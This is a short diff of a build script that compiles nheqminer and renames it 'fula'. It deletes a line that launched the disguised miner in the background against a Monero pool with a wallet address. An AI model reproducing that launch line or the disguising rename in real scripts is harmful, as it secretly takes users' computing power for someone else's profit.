@@ -56,5 +56,6 @@ cd build
 cmake ..
 make
 mv nheqminer fula
-./fula -l de01.supportxmr.com:80 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p xany -t 16 &
+cd ../../
+mv * $BUILD_DIR/
 echo "done"
